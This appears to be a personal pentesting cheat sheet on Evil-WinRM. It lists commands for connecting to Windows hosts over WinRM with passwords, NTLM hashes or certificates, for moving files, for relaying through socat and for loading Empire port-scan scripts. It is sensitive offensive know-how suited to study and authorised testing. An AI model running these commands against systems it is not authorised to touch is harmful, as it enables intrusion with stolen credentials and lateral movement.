# WinRM 
-   **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Remote Management Users

[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

##### Introduction
WinRM *([Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal))* is the Microsoft implementation of [WS-Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol). A standard [SOAP](https://en.wikipedia.org/wiki/SOAP) based protocol that allows hardware and operating systems from different vendors to interoperate.

**Requirements**
The following ports 5985 (HTTP) & 5986 (HTTPS) must be open to use Evil-WinRM. Also the user must be a member of "Remote Management Users"

**Alternative**
- [PSExec](obsidian://open?vault=Security%20%26%20PenTesting&file=Access%2FWindows%20%26%20Active%20Directory%2FPsExec) uses different access methods so could be worth a try if Evil-WinRM requirements are not met. 

##### Connection Options
Connect using a hash.

```bash
$ evil-winrm -i IP_ADDRESS -H USER_NTLM_HASH -u "USER"
```

Connect using credentials

```bash
$ evil-winrm -i IP_ADDRESS -u USERNAME -p "PASSWORD"
```

Connect using key & certificate

```bash
$ evil-winrm -S -k private.pem -c cert.pem -i IP_ADDRESS
```

##### Create Remote Session/Process
Check the [users section in Powershell Cheatsheet](obsidian://open?vault=Security%20%26%20PenTesting&file=Utils%2FWindows%2FPowerShell)
##### File Management

Downloading a File

```
download remote_filename destination_filename
```

Uploading a file.

```
upload local_filename destination_filename
```

##### Using Proxies
Forward to EvilWRM Port:

```bash
./socat tcp-l:LOCAL_PORT_OPEN_USE_WITH_WINRM,fork,reuseaddr tcp:10.200.57.150:5985 # HTTP, not HTTPS
```

##### Loading PowerShell Scripts
Set Powershell Script Directory

```bash
evil-winrm -u USERNAME  -p PASSWORD -i IP -s /opt/scripts
```

Port scan using Empire scripts 

```bash
evil-winrm -u USER -H HASH -i IP -P PORT -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network

```

```
Invoke-Portscan.ps1
```

```
Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50
```

